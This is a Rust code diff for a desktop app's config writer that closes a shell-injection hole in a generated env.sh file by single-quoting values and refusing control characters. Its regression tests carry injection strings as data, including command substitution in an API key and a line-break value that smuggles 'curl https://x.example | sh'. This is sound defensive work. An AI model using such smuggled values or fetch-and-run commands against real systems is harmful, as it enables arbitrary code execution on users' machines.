@@ -265,7 +265,7 @@ pub fn escrever(window: &WebviewWindow, req: String, v: &Value) {
         }
     };
 
-    confirmar_e_gravar(window, req, cliente, destino, escrita);
+    confirmar_e_gravar(window, req, cliente, destino, escrita, &base, &modelo);
 }
 
 /// A base é o nosso servidor, em https?
@@ -304,15 +304,30 @@ fn montar_puro(
     chave: &str,
     modelo: &str,
 ) -> Result<Escrita, String> {
+    // The three values come from the page. None of them has a reason to hold a line break or any other control
+    // character, and in `env.sh` a line break would start a shell line of the page's choosing, even inside the
+    // comment that names the model. Refused for every client, so the JSON files get the same rule.
+    for (campo, valor) in [("o endereço", base), ("a chave", chave), ("o modelo", modelo)] {
+        if valor.chars().any(char::is_control) {
+            return Err(format!(
+                "{campo} veio com quebra de linha ou outro caractere de controle; nada foi gravado"
+            ));
+        }
+    }
+
     let conteudo = match cliente {
         Cliente::Env => {
-            // Arquivo nosso: reescrito inteiro, e é justamente por isso que ele não é o
-            // `.zshrc`.
+            // Our own file, rewritten whole, which is why it is not the `.zshrc`. The person runs it with `source`, so
+            // every value is a single-quoted shell word: the shell expands nothing inside single quotes, so `$(…)`,
+            // backticks and `"` in a value stay text. Until 1.38.8 the values went between double quotes, where
+            // `$(…)` runs.
             format!(
                 "# Gerado pelo ShvIA Desktop. Use com: source ~/.shvia/env.sh\n\
-                 export OPENAI_BASE_URL=\"{base}\"\n\
-                 export OPENAI_API_KEY=\"{chave}\"\n\
-                 # modelo sugerido: {modelo}\n"
+                 export OPENAI_BASE_URL={}\n\
+                 export OPENAI_API_KEY={}\n\
+                 # modelo sugerido: {modelo}\n",
+                palavra_de_shell(base),
+                palavra_de_shell(chave),
             )
         }
         Cliente::Continue => {
@@ -362,6 +377,12 @@ fn montar_puro(
     Ok(Escrita { conteudo, anterior: atual.map(str::to_owned) })
 }
 
+/// `valor` as one POSIX shell word that the shell reads back exactly: in single quotes, with each `'` written as
+/// `'\''` (close the quotes, an escaped quote, open them again).
+fn palavra_de_shell(valor: &str) -> String {
+    format!("'{}'", valor.replace('\'', r"'\''"))
+}
+
 /// Lê o JSON existente, ou começa de um objeto vazio.
 ///
 /// **Arquivo com JSON inválido aborta** em vez de ser substituído: um `config.json` que o
@@ -385,16 +406,28 @@ fn erro_formato(destino: &Path) -> String {
 }
 
 /// Pede confirmação nativa e grava.
-fn confirmar_e_gravar(window: &WebviewWindow, req: String, cliente: Cliente, destino: PathBuf, escrita: Escrita) {
+fn confirmar_e_gravar(
+    window: &WebviewWindow,
+    req: String,
+    cliente: Cliente,
+    destino: PathBuf,
+    escrita: Escrita,
+    base: &str,
+    modelo: &str,
+) {
     use tauri_plugin_dialog::{DialogExt, MessageDialogButtons};
 
     let win = window.clone();
     let caminho_txt = destino.display().to_string();
 
+    // The server and the model are what the person is agreeing to send their CLI to, so the dialog names them;
+    // until 1.38.8 it showed only the path. The key stays out (comment on the buttons below).
     let corpo = format!(
-        "Vou gravar a configuração do {} em:\n\n{}\n\n{}",
+        "Vou gravar a configuração do {} em:\n\n{}\n\nServidor: {}\nModelo: {}\n\n{}",
         cliente.rotulo(),
         caminho_txt,
+        base,
+        modelo,
         if escrita.anterior.is_some() {
             "O arquivo já existe: as entradas do ShvIA serão trocadas. O original será preservado até a gravação concluir. Não será criada cópia de segurança com credenciais."
         } else {
@@ -569,7 +602,55 @@ mod tests {
         let c = montar_com(Cliente::Env, None).expect("monta").conteudo;
 
         assert!(c.contains("source ~/.shvia/env.sh"));
-        assert!(c.contains("export OPENAI_BASE_URL=\"https://ai.shvia.org/v1\""));
+        assert!(c.contains("export OPENAI_BASE_URL='https://ai.shvia.org/v1'"));
+    }
+
+    /// `source ~/.shvia/env.sh` gives back exactly what the page sent, and runs none of it. Proved with a real
+    /// shell: every way a value could start a command (`$(…)`, backticks, a `"` that closes the quotes, a `'` that
+    /// closes single ones) is in the key and the base, and a command that ran would leave the marker file.
+    #[cfg(unix)]
+    #[test]
+    fn o_env_sh_devolve_os_valores_sem_executar_nada() {
+        let pasta = std::env::temp_dir().join(format!("shvia-env-sh-{}", std::process::id()));
+        std::fs::create_dir_all(&pasta).expect("pasta");
+        let marca = pasta.join("rodou");
+        let m = marca.display();
+        let chave = format!("sk-'$(touch {m})`touch {m}`\"; touch {m}; \"'; touch {m}; '");
+        let base = format!("https://ai.shvia.org/v1/$(touch {m})");
+
+        let e = montar_puro(Cliente::Env, &caminho_falso("env.sh"), None, &base, &chave, "anna").expect("monta");
+        let arquivo = pasta.join("env.sh");
+        std::fs::write(&arquivo, &e.conteudo).expect("grava");
+        let saida = crate::processo::comando("sh")
+            .arg("-c")
+            .arg(". \"$1\" && printf '%s\\n%s' \"$OPENAI_BASE_URL\" \"$OPENAI_API_KEY\"")
+            .arg("sh")
+            .arg(&arquivo)
+            .output()
+            .expect("sh");
+
+        let rodou = marca.exists();
+        let _ = std::fs::remove_dir_all(&pasta);
+        assert!(!rodou, "sourcing env.sh ran a command the page wrote:\n{}", e.conteudo);
+        assert!(saida.status.success(), "{}", String::from_utf8_lossy(&saida.stderr));
+        assert_eq!(String::from_utf8_lossy(&saida.stdout), format!("{base}\n{chave}"));
+    }
+
+    /// A line break in any value would start a line of the page's choosing in `env.sh`, the model's comment line
+    /// included. Nothing is written, for every client.
+    #[test]
+    fn valor_com_quebra_de_linha_nao_e_gravado() {
+        let base = "https://ai.shvia.org/v1";
+        for cliente in [Cliente::Env, Cliente::Continue, Cliente::ClaudeCode] {
+            for (b, c, m) in [
+                (base, "sk-teste", "anna\ncurl https://x.example | sh"),
+                (base, "sk-teste\rexport X=1", "anna"),
+                ("https://ai.shvia.org/v1\ntouch /tmp/x", "sk-teste", "anna"),
+            ] {
+                let r = montar_puro(cliente, &caminho_falso("config"), None, b, c, m);
+                assert!(r.is_err(), "{cliente:?} accepted a control character: {b:?} {c:?} {m:?}");
+            }
+        }
     }
 
     fn montar_com(cliente: Cliente, atual: Option<&str>) -> Result<Escrita, String> {
